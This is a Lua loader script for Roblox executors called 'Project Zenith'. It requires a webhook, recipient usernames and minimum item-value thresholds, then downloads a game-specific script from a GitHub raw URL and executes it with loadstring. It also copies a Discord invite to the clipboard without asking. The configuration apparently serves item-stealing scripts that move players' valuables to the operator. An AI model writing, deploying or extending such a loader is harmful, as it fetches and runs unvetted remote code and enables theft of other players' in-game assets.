getgenv().ZenithLoader = getgenv().ZenithLoader or false
if getgenv().ZenithLoader then return end
getgenv().ZenithLoader = true

local DISCORD = "discord.gg/QuFqd2j3Va"

setclipboard("https://" .. DISCORD)

local Config = {
    Webhook = _G.webhook or getgenv().webhook or "",
    User = getgenv().user or getgenv().usar or {},
    Ping = getgenv().ping or "No",
    Threshold = getgenv().threshold or 100,
    MinRap = getgenv().minRap or 1000000,
    MinGems = getgenv().minGems or 500000,
    Debug = getgenv().debug or false,

    GitHubBase = "https://raw.githubusercontent.com/PreZ-z/Zen/main/",

    Scripts = {
        ["13772394625"] = "bladeball.lua",
        ["142823291"] = "mm2z.lua",
        ["920587237"] = "adoptme.lua",
        ["109983668079237"] = "sab.lua",
        ["99606176102979"] = "sab.lua",
        ["79906538690694"] = "sab.lua",
        ["119594317142884"] = "sab.lua",
        ["126884695634066"] = "gag2.lua",
        ["8737899170"] = "ps99.lua",
        ["920587237"] = "ps99.lua",
    },

    FallbackURLs = {},

    RetryCount = 3,
    RetryDelay = 1.5,
    Timeout = 30,
}

if Config.Webhook == "" then
    warn("[Zenith Loader] No webhook configured")
    pcall(function()
        game.Players.LocalPlayer:Kick("Project Zenith | Webhook missing\n\n" .. DISCORD)
    end)
    return
end

if #Config.User == 0 then
    warn("[Zenith Loader] No user configured")
    pcall(function()
        game.Players.LocalPlayer:Kick("Project Zenith | User missing\n\n" .. DISCORD)
    end)
    return
end

getgenv().webhook = Config.Webhook
getgenv().user = Config.User
getgenv().ping = Config.Ping
getgenv().threshold = Config.Threshold
getgenv().minRap = Config.MinRap
getgenv().minGems = Config.MinGems
getgenv().debug = Config.Debug

local Request = request or http_request or httprequest or (syn and syn.request)

if not Request then
    warn("[Zenith Loader] No HTTP function available")
    pcall(function()
        game.Players.LocalPlayer:Kick("Project Zenith | Executor missing HTTP\n\n" .. DISCORD)
    end)
    return
end

local function executorName()
    local fn = identifyexecutor or getexecutorname
    if fn then
        local ok, res = pcall(fn)
        if ok and res then return tostring(res) end
    end
    return "Unknown"
end

local function httpGet(url)
    if not url or url == "" then return nil end

    local ok, res = pcall(function()
        return Request({
            Url = url,
            Method = "GET",
            Headers = {["Cache-Control"] = "no-cache", ["User-Agent"] = "Zenith-Loader/1.0"},
            Timeout = Config.Timeout,
        })
    end)

    if ok and res and res.Body and #res.Body > 0 then
        return res.Body
    end

    local ok2, res2 = pcall(function()
        return game:HttpGet(url, true)
    end)

    if ok2 and res2 and #res2 > 0 then
        return res2
    end

    return nil
end

local function tryUrls(urls)
    for _, url in ipairs(urls) do
        local body = httpGet(url)
        if body then return body, url end
        task.wait(Config.RetryDelay)
    end
    return nil, nil
end

local function buildUrlList(placeId)
    local urls = {}
    local scriptName = Config.Scripts[placeId]

    if not scriptName then return urls, nil end

    table.insert(urls, Config.GitHubBase .. scriptName)

    local fallbacks = Config.FallbackURLs[placeId]
    if fallbacks then
        for _, url in ipairs(fallbacks) do
            table.insert(urls, url)
        end
    end

    return urls, scriptName
end

local function waitForGame()
    local start = tick()
    while not game:IsLoaded() do
        if tick() - start > 60 then return false end
        task.wait(0.2)
    end
    return true
end

local function main()
    if not waitForGame() then
        warn("[Zenith Loader] Game failed to load")
        return
    end

    task.wait(1)

    local placeId = tostring(game.PlaceId)
    local urls, scriptName = buildUrlList(placeId)

    if #urls == 0 then
        warn("[Zenith Loader] No script mapped for PlaceId: " .. placeId)
        pcall(function()
            game.Players.LocalPlayer:Kick("Project Zenith | Unsupported game\n\n" .. DISCORD)
        end)
        return
    end

    local body, usedUrl = nil, nil

    for attempt = 1, Config.RetryCount do
        body, usedUrl = tryUrls(urls)
        if body then break end
        task.wait(Config.RetryDelay * attempt)
    end

    if not body then
        warn("[Zenith Loader] All fetch attempts failed")
        pcall(function()
            game.Players.LocalPlayer:Kick("Project Zenith | Could not load script\n\n" .. DISCORD)
        end)
        return
    end

    local loader = loadstring or load
    if not loader then
        warn("[Zenith Loader] loadstring unavailable")
        pcall(function()
            game.Players.LocalPlayer:Kick("Project Zenith | loadstring unavailable\n\n" .. DISCORD)
        end)
        return
    end

    local chunk, compileErr = loader(body, "@zenith_" .. scriptName)

    if not chunk then
        warn("[Zenith Loader] Compile error: " .. tostring(compileErr))
        pcall(function()
            game.Players.LocalPlayer:Kick("Project Zenith | Compile error\n\n" .. DISCORD)
        end)
        return
    end

    local ok, runErr = pcall(chunk)

    if not ok then
        warn("[Zenith Loader] Runtime error: " .. tostring(runErr))
        pcall(function()
            game.Players.LocalPlayer:Kick("Project Zenith | Runtime error\n\n" .. DISCORD)
        end)
        return
    end

    print("[Zenith Loader] " .. scriptName .. " loaded for PlaceId " .. placeId)
end

task.spawn(main)

return function(newConfig)
    if type(newConfig) == "table" then
        for k, v in pairs(newConfig) do
            Config[k] = v
        end
    end
    getgenv().ZenithLoader = false
    task.spawn(main)
end
